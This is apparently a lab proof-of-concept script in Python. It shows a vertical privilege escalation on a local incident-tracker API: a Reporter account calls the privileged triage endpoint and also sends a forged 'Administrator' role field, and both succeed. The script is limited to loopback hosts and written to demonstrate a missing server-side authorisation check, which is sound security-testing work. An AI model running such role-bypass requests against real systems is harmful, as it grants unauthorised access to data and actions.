"""Controlled local LR04 point 10 vertical-privilege PoC.

The request bodies and output intentionally omit credentials, cookies and raw
response headers. It targets only an isolated loopback API started by the
PowerShell wrapper.
"""

import argparse
import http.cookiejar
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


ALICE_NEW_FOR_TRANSITION = "20000000-0000-0000-0000-000000000005"
ALICE_NEW_FOR_ROLE_PROBE = "20000000-0000-0000-0000-000000000003"
ALICE_ID = "10000000-0000-0000-0000-000000000001"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Client:
    def __init__(self, host):
        self.host = host
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({}),
            urllib.request.HTTPCookieProcessor(self.jar),
            NoRedirect(),
        )

    def request(self, path, data=None, method=None):
        headers = {"Accept": "application/json"}
        if data is not None:
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(
            self.host + path,
            data=None if data is None else json.dumps(data).encode("utf-8"),
            headers=headers,
            method=method,
        )
        try:
            response = self.opener.open(request, timeout=15)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            raw = response.read()
            return response.status, response.headers.get_content_type(), json.loads(raw) if raw else None


def require(condition, message):
    if not condition:
        raise AssertionError(message)


def emit(label, result):
    status, content_type, body = result
    safe = {"scenario": label, "status": status, "contentType": content_type}
    if isinstance(body, dict):
        safe["body"] = {key: body[key] for key in ("id", "status", "title") if key in body}
    print(json.dumps(safe, ensure_ascii=False))


def details(client, incident_id, label):
    result = client.request("/api/incidents/" + incident_id)
    emit(label, result)
    require(result[0] == 200 and result[1] == "application/json", label + ": details unavailable")
    require(result[2]["id"] == incident_id, label + ": wrong resource")
    return result[2]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="http://localhost:5080")
    args = parser.parse_args()
    host = urllib.parse.urlsplit(args.host)
    require(host.scheme in ("http", "https") and host.hostname in ("localhost", "127.0.0.1", "::1")
            and not host.username and not host.password and host.path in ("", "/")
            and not host.query and not host.fragment, "Use a loopback host for the synthetic lab")
    password = os.environ.get("SeedUsers__Password")
    require(bool(password), "Set SeedUsers__Password outside Git")

    alice = Client(args.host.rstrip("/"))
    login = alice.request("/api/auth/login", {"userName": "alice", "password": password})
    print("alice_login_status=" + str(login[0]))
    require(login[0] == 204, "Alice login failed")
    me = alice.request("/api/me")
    require(me[0] == 200 and me[2]["id"] == ALICE_ID, "Wrong verified principal")
    print("alice_verified_role=Reporter")

    own_before = details(alice, ALICE_NEW_FOR_TRANSITION, "P10 Alice reads own New Incident")
    require(own_before["status"] == "New", "Expected a New resource for triage")
    permitted_update = alice.request(
        "/api/incidents/" + ALICE_NEW_FOR_TRANSITION,
        {"title": own_before["title"], "description": own_before["description"] + " Контрольована зміна."},
        method="PUT")
    emit("P10 permitted Reporter own content update", permitted_update)
    require(permitted_update[0] == 204, "Reporter own update should be allowed")
    print("permitted_owner_operation_status=204")

    ordinary_triage = alice.request(
        "/api/incidents/" + ALICE_NEW_FOR_TRANSITION + "/triage", method="POST")
    emit("P10 Reporter invokes privileged triage", ordinary_triage)
    require(ordinary_triage[0] == 204, "Vulnerable Reporter triage was not reproduced")
    own_after = details(alice, ALICE_NEW_FOR_TRANSITION, "P10 Alice reads after privileged transition")
    require(own_after["status"] == "Triaged", "Privileged status did not change")
    print("vertical_privilege_escalation_reproduced=true")

    role_probe_before = details(alice, ALICE_NEW_FOR_ROLE_PROBE, "P10 role probe resource before")
    require(role_probe_before["status"] == "New", "Expected second New resource for role probe")
    role_probe = alice.request(
        "/api/incidents/" + ALICE_NEW_FOR_ROLE_PROBE + "/triage",
        {"role": "Administrator"}, method="POST")
    emit("P10 Reporter triage with forged JSON role", role_probe)
    require(role_probe[0] == ordinary_triage[0] == 204, "Unexpected role-body result")
    role_probe_after = details(alice, ALICE_NEW_FOR_ROLE_PROBE, "P10 role probe resource after")
    require(role_probe_after["status"] == "Triaged", "Role-body probe did not mutate vulnerable transition")
    print("forged_role_body_status=204; same_as_empty_body=true")
    print("root_cause=no_server_side_role_or_policy_decision_for_Incident.Triage")
    print("p10_vulnerable_poc_checks=passed")


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8")
    try:
        main()
    except AssertionError as error:
        print("check_failed=" + str(error), file=sys.stderr)
        sys.exit(1)
    except (OSError, ValueError, KeyError, TypeError):
        print("request_failed: check the local API and seed; sensitive details omitted", file=sys.stderr)
        sys.exit(1)
